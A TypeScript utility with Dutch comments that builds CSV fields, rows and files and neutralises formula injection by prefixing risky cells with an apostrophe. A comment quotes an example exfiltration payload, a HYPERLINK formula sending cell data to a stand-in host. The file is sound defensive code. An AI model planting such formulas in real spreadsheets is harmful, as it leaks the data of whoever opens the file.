/**
 * Velden en regels voor een CSV-export.
 *
 * Waarom dit bestand bestaat: deze codebase bouwde zijn CSV's op vier
 * verschillende manieren, met twee verschillende soorten fouten erin.
 *
 * **Structureel kapot.** `routes/tickets.ts` wikkelde elk veld in
 * aanhalingstekens maar ontsnapte de aanhalingstekens erín niet. Een koper die
 * zich `Jan "Bassie" de Vries` noemt sluit het veld halverwege af, en alles
 * daarna schuift een kolom op - voor die rij én voor elke rij erna.
 * `routes/concerts.ts` deed helemaal geen aanhalingstekens: daar breekt al een
 * komma in een concertnaam de kolommen.
 *
 * **Formule-injectie.** Alle vier de manieren lieten dit staan, ook de twee die
 * structureel wél klopten. Een cel die begint met `=`, `+`, `-` of `@` wordt
 * door Excel, LibreOffice en Google Sheets als formule uitgevoerd zodra iemand
 * het bestand opent. Een concertnaam als `=HYPERLINK("http://kwaad/"&A1)` haalt
 * dan gegevens uit het bestand naar buiten, en de gebruiker ziet alleen een
 * link. Aanhalingstekens helpen daar niet tegen: die zijn CSV-syntaxis en
 * worden bij het inlezen weggehaald voordat de cel geëvalueerd wordt.
 *
 * De bestaande hulpjes deden alleen het eerste. `escapeCsvField` in interop.ts
 * quoot netjes volgens RFC 4180; `toCSV` in accounting.ts ook. Geen van beide
 * kende het tweede probleem.
 */

/**
 * Tekens waarmee een cel een formule kan worden.
 *
 * Naast de vier bekende ook tab en regelterugloop: sommige versies van Excel
 * slaan leidende witruimte over en kijken naar het teken daarna.
 */
const FORMULEBEGIN = /^[=+\-@\t\r]/;

/** Het scheidingsteken tussen de velden. */
export type Scheidingsteken = ',' | ';';

/**
 * Eén veld, klaar om tussen twee scheidingstekens te zetten.
 *
 * Getallen worden niet als formule behandeld - anders zou een negatief bedrag
 * als `'-12,50` in de kolom komen te staan en niet meer optelbaar zijn. Dat
 * onderscheid kan alleen hier, waar het type nog bekend is; verderop is alles
 * tekst.
 */
export function csvVeld(waarde: unknown, scheidingsteken: Scheidingsteken = ','): string {
  if (waarde === null || waarde === undefined) return '';

  if (typeof waarde === 'number') {
    if (!Number.isFinite(waarde)) return '';
    // Bij puntkomma's hoort de Nederlandse schrijfwijze met een komma als
    // decimaalteken; dat is wat Excel in deze regio verwacht.
    return scheidingsteken === ';' ? String(waarde).replace('.', ',') : String(waarde);
  }

  let tekst = String(waarde);

  // De apostrof is geen inhoud maar een aanwijzing aan de spreadsheet: "lees
  // dit als tekst". Excel en LibreOffice tonen hem niet in de cel.
  if (FORMULEBEGIN.test(tekst)) {
    tekst = `'${tekst}`;
  }

  // Alleen quoten wanneer het moet houdt het bestand leesbaar voor wie het in
  // een editor opent, en scheelt ruimte bij grote exports.
  if (tekst.includes(scheidingsteken) || tekst.includes('"') || /[\r\n]/.test(tekst)) {
    return `"${tekst.replace(/"/g, '""')}"`;
  }

  return tekst;
}

/** Eén regel, zonder de afsluitende regelovergang. */
export function csvRegel(velden: unknown[], scheidingsteken: Scheidingsteken = ','): string {
  return velden.map((veld) => csvVeld(veld, scheidingsteken)).join(scheidingsteken);
}

/**
 * Een compleet bestand: kopregel, gegevens, en een regelovergang aan het eind.
 *
 * De afsluitende regelovergang staat er omdat sommige verwerkers de laatste
 * regel anders overslaan.
 */
export function csvBestand(kopregel: string[], rijen: unknown[][], scheidingsteken: Scheidingsteken = ','): string {
  return [csvRegel(kopregel, scheidingsteken), ...rijen.map((rij) => csvRegel(rij, scheidingsteken))].join('\n') + '\n';
}
